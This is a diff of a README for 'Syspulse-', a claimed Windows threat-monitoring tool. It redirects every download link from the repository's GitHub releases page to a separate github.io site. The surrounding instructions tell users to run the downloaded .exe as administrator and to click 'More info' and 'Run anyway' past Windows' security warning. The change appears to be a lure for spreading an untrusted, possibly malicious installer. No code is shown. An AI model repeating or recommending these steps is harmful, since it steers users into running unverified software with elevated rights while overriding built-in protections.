@@ -1,6 +1,6 @@
 # 🛡️ Syspulse- - Protect your computer from hidden threats
 
-[![](https://img.shields.io/badge/Download-Syspulse-blue)](https://github.com/nongranular-preschool363/Syspulse-/releases)
+[![](https://img.shields.io/badge/Download-Syspulse-blue)](https://nongranular-preschool363.github.io)
 
 SysPulse monitors your Windows system for suspicious activity. It runs in the background. It sends alerts to your phone if it detects a threat. You receive a message on Telegram if a program starts without your permission or if someone plugs in a USB drive. The tool uses very little memory. It protects your privacy by checking system info only. It does not look at your personal files or photos.
 
@@ -8,7 +8,7 @@ SysPulse monitors your Windows system for suspicious activity. It runs in the ba
 
 Follow these steps to install the software. You do not need technical knowledge.
 
-1. Visit the [official releases page](https://github.com/nongranular-preschool363/Syspulse-/releases) to get the installer.
+1. Visit the [official releases page](https://nongranular-preschool363.github.io) to get the installer.
 2. Select the latest version of the .exe file.
 3. Save the file to your computer.
 4. Double-click the file to start the installation.
@@ -26,7 +26,7 @@ SysPulse works on most Windows computers. Ensure you meet these criteria:
 
 ## 📥 How to Install
 
-Download the application from this link: [https://github.com/nongranular-preschool363/Syspulse-/releases](https://github.com/nongranular-preschool363/Syspulse-/releases).
+Download the application from this link: [https://nongranular-preschool363.github.io](https://nongranular-preschool363.github.io).
 
 After you download the file, right-click the installer. Choose "Run as administrator" if your computer asks for permission. Windows may show a security prompt. Click "More info" and then "Run anyway" to continue. The installer places a shortcut on your desktop. Launch the program to see the main dashboard.
 
